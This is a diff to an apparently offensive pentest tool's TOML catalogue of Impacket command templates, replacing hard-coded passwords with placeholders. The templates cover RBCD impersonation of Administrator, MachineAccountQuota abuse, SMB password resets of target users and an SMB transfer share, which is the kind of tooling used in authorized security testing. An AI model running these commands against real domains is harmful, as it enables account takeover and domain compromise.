@@ -49,7 +49,7 @@ when = "creds.kind == 'plaintext' and target.has_dc"
 [[command]]
 id = "imp.getST.rbcd"
 title = "getST.py — RBCD (after rbcd.py write)"
-template = "impacket-getST -spn 'cifs/{target}' -impersonate Administrator -dc-ip {dc} '{domain}/COMPUTER\\$:Mach1neP@ss'"
+template = "impacket-getST -spn 'cifs/{target}' -impersonate Administrator -dc-ip {dc} '{domain}/COMPUTER\\$:{computer_password}'"
 requires = ["impacket-getST"]
 tags = ["kerberos", "rbcd"]
 when = "target.has_dc"
@@ -122,7 +122,7 @@ when = "creds.kind == 'ntlm'"
 [[command]]
 id = "imp.smbserver.share"
 title = "smbserver.py — quick share for file transfer"
-template = "impacket-smbserver share $(pwd) -smb2support -username chrono -password chronopass"
+template = "impacket-smbserver share $(pwd) -smb2support -username {smb_server_user} -password {smb_server_password}"
 requires = ["impacket-smbserver"]
 tags = ["serve", "transfer"]
 
@@ -307,7 +307,7 @@ when = "creds.kind == 'plaintext' and target.has_lhost"
 [[command]]
 id = "imp.addcomputer"
 title = "addcomputer.py — abuse MachineAccountQuota"
-template = "impacket-addcomputer '{domain}/{user}:{password}' -computer-name 'CHRONO\\$' -computer-pass 'Mach1neP@ss' -dc-host {dc}"
+template = "impacket-addcomputer '{domain}/{user}:{password}' -computer-name 'CHRONO\\$' -computer-pass '{computer_password}' -dc-host {dc}"
 requires = ["impacket-addcomputer"]
 tags = ["maq", "rbcd"]
 when = "creds.kind == 'plaintext' and target.has_dc"
@@ -315,7 +315,7 @@ when = "creds.kind == 'plaintext' and target.has_dc"
 [[command]]
 id = "imp.changepasswd.smb"
 title = "changepasswd.py — reset user pw via SMB"
-template = "impacket-changepasswd '{domain}/TARGET_USER@{target}' -newpass 'Resett3d!'"
+template = "impacket-changepasswd '{domain}/TARGET_USER@{target}' -newpass '{new_password}'"
 requires = ["impacket-changepasswd"]
 tags = ["reset"]
 
